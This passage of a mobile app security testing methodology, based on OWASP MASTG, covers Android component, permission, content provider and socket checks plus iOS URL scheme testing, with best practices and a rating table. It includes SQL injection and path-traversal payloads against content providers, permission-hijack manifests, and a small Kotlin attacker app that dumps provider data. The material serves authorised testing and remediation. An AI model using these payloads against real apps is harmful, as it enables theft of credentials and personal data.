The check **fails** if a runtime receiver that performs a sensitive action accepts broadcasts from other apps, or if the app broadcasts sensitive data (tokens, identifiers, OTPs, personal data) in a way other apps can receive or tamper with, including any sticky broadcast with sensitive content. It **passes** when internal receivers use `RECEIVER_NOT_EXPORTED` (or a signature permission on older devices) and outgoing broadcasts are restricted by package or signature permission.

### GT-0018-4: Custom permission definitions (Android)

Guler Tech methodology. Platform: Android. Type: static (config) and dynamic (attacker app).

#### Overview

Every OWASP test above ends with "verify that the permission is effective". This check does that systematically: it finds permissions that are referenced but not defined, defined with weak levels, or misspelt, and proves exploitability by defining or requesting them from the attacker app.

#### Prerequisites

- The decoded manifest; `xmlstarlet`; `adb`; the attacker app.

#### Steps

1. **List defined and referenced permissions**, and compare them:

   ```bash
   M=out/resources/AndroidManifest.xml
   xmlstarlet sel -t -m '//permission' -v '@android:name' -o ' level=' -v '@android:protectionLevel' -n "$M"
   xmlstarlet sel -t -m '//*[@android:permission or @android:readPermission or @android:writePermission]' \
     -v '@android:permission' -n -v '@android:readPermission' -n -v '@android:writePermission' -n "$M" \
     | grep -v '^$' | sort -u > referenced.txt
   xmlstarlet sel -t -m '//permission' -v '@android:name' -n "$M" | sort -u > defined.txt
   comm -23 referenced.txt defined.txt | grep -v '^android\.permission\.'     # referenced but not defined here
   ```

   Also include permissions named in `registerReceiver(…, broadcastPermission, …)` and `sendBroadcast(intent, permission)` calls from the code.

2. **Resolve each undefined name on the device**: `adb shell dumpsys package permission <name>`. If no package defines it, it is dangling. If it is defined by another app, check that app's signer and level.

3. **Look for near-duplicates** among defined and referenced names (`permision`, `PERMISSION` versus `Permission`, a missing `.permission.` segment): a typo turns a defined signature permission into a dangling one.

4. **Prove it.** For a weak level, add `<uses-permission android:name="…"/>` to the attacker app and call the component. For a dangling name, add a definition to the attacker app and request it:

   ```xml
   <permission android:name="com.example.app.permission.ADMIN" android:protectionLevel="normal" />
   <uses-permission android:name="com.example.app.permission.ADMIN" />
   ```

   Install, confirm with `adb shell dumpsys package com.attacker.probe | grep -A3 'install permissions'` that it is granted, and call the protected component.

#### Observation

The defined/referenced comparison, protection levels, `dumpsys` results, and the outcome of the attacker-app calls.

#### Evaluation

The check **fails** if a component that exposes sensitive functionality is protected by a permission that is `normal`, `dangerous`, undefined, or misspelt, and the attacker app obtains it. It **passes** when every protecting permission is defined by a trusted app with `signature`, `signature|knownSigner` or a system level, and the names match exactly.

### GT-0018-5: Content provider injection, path permissions and file access (Android)

Guler Tech methodology. Platform: Android. Type: dynamic (adb, drozer) with static confirmation.

#### Overview

MASTG-TEST-0355/0356 establish whether a provider is reachable. This check establishes how far reachability extends: other tables through SQL injection, protected paths through path-permission gaps, sensitive operations through `call()`, and arbitrary files through `openFile` traversal.

#### Prerequisites

- An exported provider (or one reachable through a grant), its routes from code, and `adb`. drozer optional.

#### Steps

1. **Probe for SQL injection** from an on-device shell, so that quoting passes through only one shell:

   ```text
   $ adb shell
   $ content query --uri content://com.example.app.provider/Passwords --projection "'"
   $ content query --uri content://com.example.app.provider/Passwords --projection "* FROM sqlite_master--"
   $ content query --uri content://com.example.app.provider/Passwords --projection "* FROM Key--"
   $ content query --uri content://com.example.app.provider/notes --where "1) OR (1=1"
   ```

   The single quote produces a `SQLiteException` that echoes the SQL being compiled — proof that your input reaches the statement. The `sqlite_master` projection lists every table and its `CREATE` statement; the third reads another table through the first table's URI. The `--where` payload breaks out of a provider-added restriction (the builder's `(restriction) AND (selection)` wrapping). drozer automates the first steps with `run scanner.provider.injection -a com.example.app` and `run app.provider.query <uri> --projection "* FROM Key;--"`.

2. **Probe path permissions.** For every `<path-permission>`, query the protected path and its variants:

   ```text
   $ content query --uri content://com.example.app.provider/Keys
   $ content query --uri content://com.example.app.provider/Keys/
   $ content query --uri content://com.example.app.provider//Keys
   $ content query --uri content://com.example.app.provider/keys
   ```

   The first should be denied. If any variant returns the same data, the path permission and the `UriMatcher` disagree about what "the path" is.

3. **Call `call()` methods** you found in the provider's `call(String method, String arg, Bundle extras)` implementation: `content call --uri content://com.example.app.provider --method <name> --arg <value>`.

4. **Probe file access** for providers that implement `openFile`:

   ```text
   $ content read --uri 'content://com.example.app.files/docs/report.pdf'
   $ content read --uri 'content://com.example.app.files/docs/..%2F..%2Fshared_prefs%2Fprefs.xml'
   $ content read --uri 'content://com.example.app.files/docs/..%2F..%2Fdatabases%2Fapp.db' > /data/local/tmp/app.db
   ```

   drozer's `run scanner.provider.traversal -a com.example.app` tries common traversal strings across all authorities.

#### Observation

Commands and outputs: SQL errors, extra tables or rows returned, path variants that bypass the path permission, `call()` results, and files read through traversal (with hashes or redacted excerpts).

#### Evaluation

The check **fails** if injection lets a caller read data beyond what the provider intends to expose, a path variant bypasses a path permission, a `call()` method performs a sensitive operation without its own caller check, or `openFile` serves files outside its intended directory. It **passes** when the builder is strict (projection map, strict mode, strict columns and grammar or parameterised raw SQL), path rules and routing agree, `call()` checks the caller, and file paths are canonicalised and confined.

#### Demo

The classic shape, as in the Sieve training app used by drozer's documentation: an exported provider with a path permission on exactly `/Keys` and an injectable projection.

```xml
<provider android:name=".DBContentProvider" android:authorities="com.example.app.provider" android:exported="true">
    <path-permission android:path="/Keys"
        android:readPermission="com.example.app.READ_KEYS" android:writePermission="com.example.app.WRITE_KEYS" />
</provider>
```

```text
$ content query --uri content://com.example.app.provider/Keys
Error while accessing provider:com.example.app.provider
java.lang.SecurityException: Permission Denial: reading com.example.app.DBContentProvider uri content://com.example.app.provider/Keys from pid=…, uid=2000 requires com.example.app.READ_KEYS, …
$ content query --uri content://com.example.app.provider/Keys/
Row: 0 Password=[redacted], pin=[redacted]
$ content query --uri content://com.example.app.provider/Passwords --projection "* FROM Key--"
Row: 0 Password=[redacted], pin=[redacted]
```

Two independent routes to the master password and PIN: the trailing slash and the injection.

### GT-0018-6: Local network services and sockets (Android)

Guler Tech methodology. Platform: Android. Type: static (code) and dynamic (adb). Covers MAS-ATTACK-0039.

#### Overview

An app that listens on a port or socket has an IPC interface with no manifest entry at all. Any app with the `INTERNET` permission can connect to `127.0.0.1`; a listener on `0.0.0.0` or the Wi-Fi address is reachable from the local network; an abstract Unix socket (`LocalServerSocket`) is reachable by any app that knows its name.

#### Prerequisites

- jadx output; `adb`; a rooted test device for identifying the owning process.

#### Steps

1. **Find listeners in code**:

   ```bash
   grep -rnE 'new ServerSocket\(|ServerSocketChannel|LocalServerSocket\(|NanoHTTPD|embeddedServer\(|AsyncHttpServer|\.bind\(new InetSocketAddress' out/sources/ | grep -v '/androidx/'
   ```

2. **Find listeners on the device** with the app running, before and after using the feature that needs them:

   ```bash
   adb shell netstat -tlnu
   adb shell su -c 'netstat -tlnup'            # inspection only: shows the owning PID
   adb shell su -c 'grep @ /proc/net/unix'     # abstract Unix sockets
   ```

3. **Talk to each listener as an unprivileged client.** Forward the port and use your tools, then repeat from the attacker app to prove an app can do it:

   ```bash
   adb forward tcp:8080 tcp:8080
   curl -sv http://127.0.0.1:8080/
   ```

   Check whether requests require a secret, whether the secret is per-session and unguessable, and whether the server binds to loopback only. For Unix sockets, check for `LocalSocket.getPeerCredentials()` in the accept loop.

#### Observation

Listening addresses and ports with the owning process, the protocol and endpoints, the authentication applied, and the responses to unauthenticated requests.

#### Evaluation

The check **fails** if a local service exposes sensitive data or actions without authenticating each connection, or binds beyond loopback without a need. It **passes** when the service is bound to loopback, requires a per-session secret not available to other apps, or (for Unix sockets) verifies the peer UID.

### GT-0018-7: URL schemes, universal links and extensions that act without authentication (iOS)

Guler Tech methodology. Platform: iOS. Type: static (bundle, binary) and dynamic. Background in the [iOS supplement](#ios-url-schemes-universal-links-and-app-extensions-supplementary).

#### Overview

The check finds every way another app, a web page or a link can deliver input to the app or its extensions, and tests whether any of them performs a privileged action — or an authentication step — without an authenticated session and explicit user confirmation.

#### Prerequisites

- The decrypted IPA ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)); `plutil`, `ldid` or `codesign`, radare2 (`rabin2`); a test device with Safari, Notes and Messages, or the simulator with `xcrun simctl`.

#### Steps

1. **Enumerate entry points** ([MASTG-TECH-0166](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0166/) for schemes, [MASTG-TECH-0111](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0111/) for entitlements):

   ```bash
   plutil -p Payload/MyApp.app/Info.plist | grep -A8 CFBundleURLTypes
   ldid -e Payload/MyApp.app/MyApp | grep -A6 -E 'associated-domains|application-groups'
   ls Payload/MyApp.app/PlugIns/
   for x in Payload/MyApp.app/PlugIns/*.appex; do plutil -p "$x/Info.plist" | grep NSExtensionPointIdentifier; done
   ```

2. **Find the routes.** Handlers parse the URL's host, path and query items; the strings are usually in the binary:

   ```bash
   rabin2 -zz Payload/MyApp.app/MyApp | grep -iE 'openURLContexts|continueUserActivity|myapp://|transfer|reset|verify|link|token|amount' | head -40
   ```

   Read each handler in a disassembler ([MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/)) and list the actions: which routes change state, which require the user to be logged in, which show a confirmation screen.

3. **Fire each route from outside the app.** On the simulator, `xcrun simctl openurl booted 'myapp://transfer?to=TEST&amount=1'` works for schemes and universal links. On a device, put the links in a note or a local HTML page and tap them. Do **not** trigger the URL from inside the target process (with Frida or objection attached to the app): `sourceApplication` is then the app itself, and an allow-list check passes when it would not for a real attacker.

4. **Repeat in each session state**: logged out, logged in and locked behind the app's PIN or Face ID, logged in and unlocked.

5. **For extensions**, invoke them from an arbitrary host app (share sheet from Notes or Photos) and observe whether they act on the user's account without authentication; inspect the App Group container on a jailbroken device for session material (`/private/var/mobile/Containers/Shared/AppGroup/<UUID>/`, especially `Library/Preferences/group.*.plist`).

#### Observation

The list of schemes, associated domains, extensions and App Groups; routes and their actions; for each route fired, the session state, what the app did and the API calls observed in the proxy.

#### Evaluation

The check **fails** if a URL, universal link or extension input performs a privileged action (payments, payee or device linking, security settings, account changes, data export) without an authenticated session **and** an explicit in-app confirmation, if it bypasses the app's lock screen, or if a link carries authentication material that logs a device in without being bound to the session that requested it. It **passes** when such routes only *navigate* to a screen that requires authentication and confirmation, and the server enforces the same.

#### Demo

A scheme handler that pays on arrival:

```swift
func scene(_ scene: UIScene, openURLContexts URLContexts: Set<UIOpenURLContext>) {
    guard let url = URLContexts.first?.url, url.host == "transfer",
          let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems else { return }
    let to = items.first(where: { $0.name == "to" })?.value ?? ""
    let amount = items.first(where: { $0.name == "amount" })?.value ?? "0"
    PaymentsClient.shared.transfer(to: to, amount: amount)   // stored session, no confirmation, no PIN
}
```

`xcrun simctl openurl booted 'myapp://transfer?to=TEST&amount=1'` produces a transfer request in the proxy with no user interaction. The fix is to route to the transfer screen with the fields pre-filled, require the app's authentication and an explicit confirmation there, and have the server demand step-up authentication for new payees ([MASWE-0023](/mobile/maswe-0023-step-up-authentication-not-implemented/)).

### A minimal attacker app in Kotlin

`adb` is enough for most exported activities, started services, manifest receivers and providers. You need an app to bind to services, receive results and URI grants, hold custom permissions, register receivers and demonstrate the attack as a real third-party app would. A single-activity project in Android Studio is enough; set `targetSdk` to the current level so that your results reflect what a current attacker app can do.

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <!-- Add <uses-permission> (and, for GT-0018-4, <permission>) entries for the permissions under test -->
    <queries>
        <package android:name="com.example.app" />   <!-- package visibility, Android 11+ -->
    </queries>
    <application android:label="GT probe">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".GrantReceiverActivity" android:exported="true" />
    </application>
</manifest>
```

```kotlin
class MainActivity : ComponentActivity() {
    private val pkg = "com.example.app"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Call one probe per run, or wire them to buttons. Results go to logcat: adb logcat -s GT
        queryProvider("content://com.example.app.provider/accounts")
    }

    private fun startTargetActivity(cls: String, action: String? = null) = runCatching {
        startActivity(Intent(action).setClassName(pkg, cls).putExtra("fromPin", true))
    }.onFailure { Log.e("GT", "activity: $it") }

    private fun startTargetService(cls: String, extras: Bundle) = runCatching {
        startService(Intent().setClassName(pkg, cls).putExtras(extras))
    }.onFailure { Log.e("GT", "service: $it") }

    private fun sendTargetBroadcast(cls: String, action: String, extras: Bundle) =
        sendBroadcast(Intent(action).setClassName(pkg, cls).putExtras(extras))   // failures are silent

    private fun queryProvider(uri: String) = runCatching {
        contentResolver.query(Uri.parse(uri), null, null, null, null)?.use { c ->
            while (c.moveToNext()) {
                Log.i("GT", (0 until c.columnCount).joinToString { "${c.getColumnName(it)}=${c.getString(it)}" })
            }
        }
    }.onFailure { Log.e("GT", "provider: $it") }
}
```

`Intent(null as String?)` is valid, so `startTargetActivity` works with or without an action; pass the filter's action for API 33+ targets. The app must be in the foreground to start activities (background activity launch restrictions since Android 10), which is why the probes run from `onCreate`. For bound services add the `ServiceConnection` from [GT-0018-2](#gt-0018-2-bound-services-and-aidl-caller-checks-android); for grants, `GrantReceiverActivity` from [GT-0018-1](#gt-0018-1-intent-redirection-and-uri-permission-grants-android). Install with `adb install -r app-debug.apk` and watch `adb logcat -s GT`.

### Proving what the server trusts

MASVS-AUTH-1 requires enforcement at the remote endpoint, so every MASWE-0018 finding that changes account state or reads server data should answer one more question: **would the server have stopped this if the client had not?** You can usually answer it from the client:

1. **Record the legitimate flow** through your proxy: log in, unlock with the PIN or biometrics, perform the action. Note every request, especially anything that looks like proof of the local step (a PIN hash, a signed challenge, a step-up token, a short-lived `X-Reauth` header).
2. **Perform the component attack** (exported activity, service, receiver, deep link) and record the requests it triggers.
3. **Compare.** If the requests are identical, or the server accepts them without the proof seen in step 1, the local gate was never a server-side control. That is the finding to headline: the backend authorises a sensitive operation on the strength of a session token alone.
4. **Replay** the step-1 request without the proof element (remove the header, reuse an old step-up token, change the account or object ID) to show whether the server validates it. This strays into API testing — OWASP ASVS 5.0 V6 (authentication), V7 (session management) and V8 (authorisation), and WSTG-ATHZ-02 and WSTG-ATHN-04 — so do it only within scope, with test accounts, and recommend a backend test where you cannot.

When the backend is out of scope, say so in the report and rate on the client-side evidence, noting that the server-side check is untested rather than present.

## Best practices

### MASTG-BEST-0052: Restrict Access to Android App Components

Source: [MASTG-BEST-0052](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0052/).

Export a component only when another app genuinely needs it, and say so explicitly either way:

- **Set `android:exported` on every component.** Do not rely on defaults: they changed with API 17 for providers and API 31 for components with intent filters, and an explicit value is what reviewers and tools can check. If a component is internal, remove its intent filters as well and reach it with an explicit intent.
- **For context-registered receivers, pass `RECEIVER_NOT_EXPORTED`** unless other apps must send to it; use `ContextCompat.registerReceiver` so the protection also applies on devices before Android 13.
- **When a component must be exported, protect it with a permission of the right level** — usually `signature`, or `signature|knownSigner` for named partners — and do not treat any `android:permission` as sufficient: `normal` and `dangerous` permissions are available to any app. For exported runtime receivers, pass that permission as `broadcastPermission`.

```xml
<permission
    android:name="com.example.app.permission.INTERNAL_IPC"
    android:protectionLevel="signature" />

<!-- Partner app signed with a different key (Android 12+) -->
<permission
    android:name="com.example.app.permission.PARTNER_SYNC"
    android:protectionLevel="signature|knownSigner"
    android:knownCerts="@array/partner_cert_digests" />

<activity android:name=".ui.AccountDetailsActivity" android:exported="false" />
<service
    android:name=".sync.PartnerSyncService"
    android:exported="true"
    android:permission="com.example.app.permission.PARTNER_SYNC" />
<receiver android:name=".push.TokenRefreshReceiver" android:exported="false" />
```

```kotlin
ContextCompat.registerReceiver(
    context,
    sessionReceiver,
    IntentFilter("com.example.app.SESSION_EXPIRED"),
    ContextCompat.RECEIVER_NOT_EXPORTED
)
```

Note the limits OWASP points out: `exported="false"` still admits same-UID apps (`sharedUserId`) and privileged system components, and a `signature` permission admits every app signed with your key — including old, unmaintained ones. Apply the same scrutiny to SDK components in the merged manifest; use `tools:node="remove"` or `tools:replace` to override a library's export settings when it exposes more than you use.

### MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers

Source: [MASTG-BEST-0049](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/).

- **Keep providers non-exported** unless another app needs them, and write `android:exported="false"` even though it is the default for modern SDK levels.
- **If a provider must be exported, enforce `readPermission` and `writePermission`** (or `permission`), and give the declared `<permission>` a `signature` level. A `<uses-permission>` in the client only *requests* a permission; the protection level decides whether it is granted, and an omitted level means `normal`.
- **Share files with a non-exported `FileProvider`, narrow paths and one-off grants.** Declare only the subdirectory meant for sharing; never `<root-path>` or `path="."`; build URIs only for files the app chose, never for a caller-supplied name; grant read (not write) unless needed; revoke explicit grants with `revokeUriPermission()` when done.

```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.example.app.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
</provider>
```

```xml
<!-- res/xml/file_paths.xml -->
<paths>
    <files-path name="reports" path="reports/" />
</paths>
```

```kotlin
val report = File(context.filesDir, "reports/statement_2026_10.pdf")   // chosen by the app, not the caller
val uri = FileProvider.getUriForFile(context, "com.example.app.fileprovider", report)
startActivity(Intent(Intent.ACTION_VIEW).apply {
    setDataAndType(uri, "application/pdf")
    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
})
```

### Related OWASP best practices and secure patterns

OWASP's [MASTG-BEST-0039](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0039/) (prevent SQL injection in providers), [MASTG-BEST-0056](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0056/) (explicit intents for internal IPC) and [MASTG-BEST-0063](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0063/) (immutable `PendingIntent`s with explicit intents) close the remaining gaps. The patterns we recommend most often:

**Check the caller in every bound-service method.**

```kotlin
class VaultService : Service() {
    private val binder = object : IVaultService.Stub() {
        override fun getStatus(): String = "ok"                     // harmless, open to any bound client

        override fun setPin(newPin: String): Boolean {
            requireTrustedCaller()                                   // on the Binder thread, before any work
            return pinStore.update(newPin)
        }
    }

    private fun requireTrustedCaller() {
        val uid = Binder.getCallingUid()
        if (uid == Process.myUid()) return
        val trusted = packageManager.hasSigningCertificate(uid, TRUSTED_CERT_SHA256, PackageManager.CERT_INPUT_SHA256)
        if (!trusted) throw SecurityException("Caller uid $uid not allowed")
    }

    override fun onBind(intent: Intent): IBinder = binder
}
```

`hasSigningCertificate` needs API 28; on older devices fall back to `checkCallingPermission()` with a signature-level permission. For `Messenger` services, check `msg.sendingUid` the same way in `handleMessage()`.

**Never forward a caller's intent unchecked.**

```kotlin
@Suppress("DEPRECATION")
val next = intent.getParcelableExtra<Intent>("next") ?: return finish()
val target = next.resolveActivity(packageManager)
if (target == null || target.packageName != packageName || target.className !in ALLOWED_DESTINATIONS) return finish()
next.removeFlags(
    Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
    Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
)
startActivity(next)
```

Better still, do not accept intents at all: accept a route name and build the internal intent yourself. On API 33+ use the type-safe `getParcelableExtra(name, Intent::class.java)`; enable `StrictMode` with `detectUnsafeIntentLaunch()` in debug builds.

**Create `PendingIntent`s immutable and explicit.**

```kotlin
val pi = PendingIntent.getActivity(
    context, 0,
    Intent(context, PaymentDetailsActivity::class.java).setPackage(context.packageName),
    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
)
```

**Lock down provider queries.**

```kotlin
val qb = SQLiteQueryBuilder().apply {
    setTables("notes")
    setProjectionMap(mapOf("_id" to "_id", "title" to "title", "body" to "body"))
    setStrict(true)                                   // API 14: reject selection that escapes its parentheses
    if (Build.VERSION.SDK_INT >= 29) {
        setStrictColumns(true)                        // unknown columns in projection are rejected
        setStrictGrammar(true)                        // subqueries and other unsafe grammar are rejected
    }
    appendWhere("owner = ")
    appendWhereEscapeString(currentUserId)            // quoted and escaped, never concatenated raw
}
val cursor = qb.query(db, projection, selection, selectionArgs, null, null, sortOrder)
```

Never concatenate a path segment or any other caller value into `appendWhere()` or into raw SQL; bind it. Check the caller in `call()`, and canonicalise paths in `openFile`:

```kotlin
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    val base = File(requireContext().filesDir, "exports").canonicalFile
    val file = File(base, uri.lastPathSegment ?: throw FileNotFoundException()).canonicalFile
    if (!file.path.startsWith(base.path + File.separator)) throw SecurityException("Path outside exports")
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
}
```

**Do not let the client be the only gate.** The data behind an "authenticated" screen should require authentication to *obtain*: server-side session checks, step-up authentication for sensitive operations ([MASWE-0023](/mobile/maswe-0023-step-up-authentication-not-implemented/)), and Keystore keys bound to user authentication for locally stored secrets ([MASWE-0016](/mobile/maswe-0016-key-access-not-restricted/)). Then an exported component that slips through review exposes a screen, not the data.

**iOS.** Treat every URL, universal link and extension input as an untrusted request: route to a screen, never perform the action on arrival; require the app's authentication and an explicit confirmation for anything that changes state; check `sourceApplication` where a scheme is meant only for your own app suite ([MASTG-BEST-0055](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0055/)); keep session material for extensions in a Keychain access group with a `…ThisDeviceOnly` class rather than in App Group preferences ([MASTG-BEST-0068](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0068/)).

## Rating findings

Rate on three things: **what the component exposes** (data sensitivity, action impact), **who can reach it** (any installed app with no permissions, an app that needs a user-approved permission, only via `adb` or physical access, only with root), and **whether the server backs the client's decision**. MAS-ATTACK-0038 assumes a malicious app is installed; we treat that as a realistic precondition for consumer apps, not a mitigating factor.

| Rating | Conditions |
|---|---|
| **Critical** | Any app without permissions can, without user interaction, perform an account-level action with the user's session that the server accepts (password, PIN or payee change, payment, device linking, MFA disablement), or read authentication material (session or refresh tokens, credentials, keys) — for example an exported service or receiver that changes credentials, a provider or URI grant exposing token files or databases, intent redirection that grants `<root-path>` files. Also: a network-reachable local service exposing the same. |
| **High** | Any app without permissions can read sensitive personal, financial or health data in bulk (an unprotected provider, a granted file, an implicit broadcast with PII); bypass the app's login, PIN or biometric screen to a screen showing sensitive data; or reach non-exported sensitive components through intent redirection or a mutable `PendingIntent`. A custom permission that is `normal`, dangling or misspelt protecting such a component rates the same. |
| **Medium** | The same exposure requires a user-approved `dangerous` permission, a precise timing (runtime receiver alive only on one screen), or one convincing user interaction; actions with limited impact (changing preferences, triggering sync or logout, forcing re-authentication, a crash); SQL injection or path-permission bypass that widens access to moderately sensitive data; a local service on loopback with weak authentication. |
| **Low** | Exported internal components with no sensitive function; debug or tooling components (Compose preview hosts, test activities) in a release build; overly broad `FileProvider` paths with no reachable grant; missing explicit `exported`, `RECEIVER_NOT_EXPORTED` or strict query builder settings where no exploit is demonstrated; iOS schemes handled without `sourceApplication` checks that only navigate. |
| **Info** | Intentional public entry points that validate input and require authentication; components protected by signature or system permissions; observations that only reproduce with root, objection or another in-process tool. |

Raise one level when the server is shown to rely on the client-side gate ([Proving what the server trusts](#proving-what-the-server-trusts)); lower one level when the exposed action is still blocked by a server-side step-up check you have observed. In the report, give the component's full name and manifest entry, the target SDK and device version, the exact command or attacker-app code, the evidence (screenshot, rows returned with values redacted, logcat, proxy request), and the fix at the component's own boundary.

## References

- OWASP MASWE — [MASWE-0018: Lack of Authentication or Authorization on App Components](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0018/) (CC BY-SA 4.0)
- OWASP MASWE — related weaknesses [MASWE-0029: Insecure Deep Links](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029/), [MASWE-0031: Allowing Untrusted App Extensions](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0031/), [MASWE-0032: Insecure Intents](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0032/), [MASWE-0050: Unsafe Handling of Untrusted Data](https://mas.owasp.org/MASWE/MASVS-CODE/MASWE-0050/) (CC BY-SA 4.0)
- OWASP MASTG — knowledge [MASTG-KNOW-0020: Inter-Process Communication (IPC) Mechanisms](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0020/), [MASTG-KNOW-0017: App Permissions](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/), [MASTG-KNOW-0132: Android Activities](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0132/), [MASTG-KNOW-0133: Android Services](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0133/), [MASTG-KNOW-0134: Android Broadcast Receivers](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0134/), [MASTG-KNOW-0117: Android ContentProvider](https://mas.owasp.org/MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0117/) (CC BY-SA 4.0)
- OWASP MASTG — related knowledge [MASTG-KNOW-0019: Deep Links](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/), [MASTG-KNOW-0024: Pending Intents](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0024/), [MASTG-KNOW-0025: Explicit vs Implicit Intents](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0025/), [MASTG-KNOW-0079: Custom URL Schemes](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0079/), [MASTG-KNOW-0080: Universal Links](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0080/), [MASTG-KNOW-0082: App Extensions](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0082/), [MASTG-KNOW-0125: App Groups](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0125/) (CC BY-SA 4.0)
- OWASP MASTG — tests [MASTG-TEST-0364](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0364/), [MASTG-TEST-0365](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0365/), [MASTG-TEST-0366](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0366/), [MASTG-TEST-0355](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0355/), [MASTG-TEST-0356](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0356/), [MASTG-TEST-0357](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0357/) (CC BY-SA 4.0)
- OWASP MASTG — related beta tests [MASTG-TEST-0339](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0339/), [MASTG-TEST-0381](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0381/), [MASTG-TEST-0370](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0370/), [MASTG-TEST-0371](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0371/), [MASTG-TEST-0388](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0388/), [MASTG-TEST-0395](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0395/); legacy (MASTG v1) tests [MASTG-TEST-0007](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/), [MASTG-TEST-0026](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/), [MASTG-TEST-0029](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/), [MASTG-TEST-0030](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/), [MASTG-TEST-0070](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/), [MASTG-TEST-0072](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/), [MASTG-TEST-0075](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/) (CC BY-SA 4.0)
- OWASP MASTG — best practices [MASTG-BEST-0052](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0052/), [MASTG-BEST-0049](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/), [MASTG-BEST-0039](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0039/), [MASTG-BEST-0056](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0056/), [MASTG-BEST-0063](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0063/), [MASTG-BEST-0055](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0055/), [MASTG-BEST-0068](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0068/) (CC BY-SA 4.0)
